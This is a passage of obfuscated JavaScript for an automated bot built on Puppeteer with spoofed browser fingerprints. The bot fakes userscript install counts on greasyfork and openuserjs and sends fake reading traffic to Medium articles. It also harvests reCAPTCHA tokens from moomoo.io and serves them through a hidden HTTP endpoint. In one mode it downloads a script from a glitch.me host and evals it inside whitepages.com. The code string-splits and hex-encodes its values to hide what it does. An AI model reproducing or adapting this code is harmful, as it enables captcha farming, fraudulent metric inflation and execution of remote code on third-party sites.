      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x19) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + W(0x1f, '3MCZ') + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + W(0x2, 'P9aZ') + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x13) + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Y(0x1a) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + X(0x5) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + X(0x7) + 'sudiparyal' + '185/differ' + Y(0x10) + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + W(0xc, '3K(h') + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + Y(0x12) + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    X(0x9) + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x23c5 + -0x35 * 0x40 + 0x59 * 0x8d
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x19a * 0xa + 0x213a + 0x6 * -0x835)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x16b5 * -0x1 + -0x2 * -0x751 + -0x24f3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x142b + -0x10ed * -0x1 + -0x3a2 * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x8 * 0x41b + -0x455 * 0x4 + -0xf84;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x723 + -0x4cc + -0x257; w < getRandomInt(-0x2 * 0xd5c + -0x43 * -0x11 + 0x1646, 0xc7 * 0x25 + 0x3 * 0xb48 + -0x3e96); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xd * 0xa93 + -0xa1e8 + 0x215bf);
        }
      }();
    }, -0x1 * -0xe21 + -0x8df * -0x2 + -0x1f7b), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1fa5 + -0x43 * 0x33 + -0x124c;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x101 * -0x20 + -0x73 * -0x3c + 0x2 * 0x296, -0x102a + -0x1762 + 0x27be)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x11 * 0xbe4 + -0x1 * 0x9732 + 0xeb43 * 0x2);
    }, 0x834 + 0x157b + -0x1d4b), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xd64 + -0xaf6 + -0x3 * -0x81e;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xadd + -0x1e48 * 0x1 + 0x1f23), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x5 * -0x1b7 + 0xa * -0x2 + 0x1 * 0x8a7), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x164efe + 0x86aa1 + 0x1b9ffd);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xed + 0x2 * 0x783 + -0xf8f);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1324 + 0x1 * -0x1423 + -0xd * -0x23);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xe8b + -0x1c9d + 0x2da2);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = d;
  async function f() {
    const a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1981 + -0x1a95 + -0x17d * -0x23) {
        const Z = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x820 + -0x1207 + 0x9e8));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x375 * 0xb + -0x20e6 + -0x521, D['indexOf']('\x20'));
        return B ? E[Z(0x6)](-0x1ef8 + 0x8a1 * 0x3 + 0x515, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x151c + -0x214e + 0x3342),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + a0(0xa, 'Kw9M') + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x18e1 + -0xa * -0x621 + -0x1f * 0x185),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + a1(0x16) + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + a1(0xd) + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + a2(0x4, 'yQTa') + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a1(0x3) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
